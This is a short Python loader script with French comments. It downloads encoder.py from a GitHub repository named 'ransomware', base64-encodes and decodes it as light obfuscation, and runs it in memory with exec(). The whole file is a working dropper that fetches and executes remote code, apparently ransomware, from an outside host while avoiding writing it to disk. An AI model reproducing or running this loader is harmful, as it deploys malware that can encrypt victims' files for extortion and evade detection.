import base64 as b64
import requests as r

# URL RAW du script cible (encoder.py)
url = "https://raw.githubusercontent.com/mehdibha09/ransomware/main/encoder.py"

try:
    print("[+] Téléchargement de encoder.py ...")
    reponse = r.get(url)

    if reponse.status_code == 200:
        code = reponse.text
        print("[+] Téléchargement réussi, exécution en mémoire...")

        # Encodage base64 pour offuscation légère
        enc = b64.b64encode(code.encode()).decode()

        # Décodage et exécution en mémoire
        exec(b64.b64decode(enc))

    else:
        print(f"[-] Échec : HTTP {reponse.status_code}")

except Exception as e:
    print("[-] Erreur :", e)
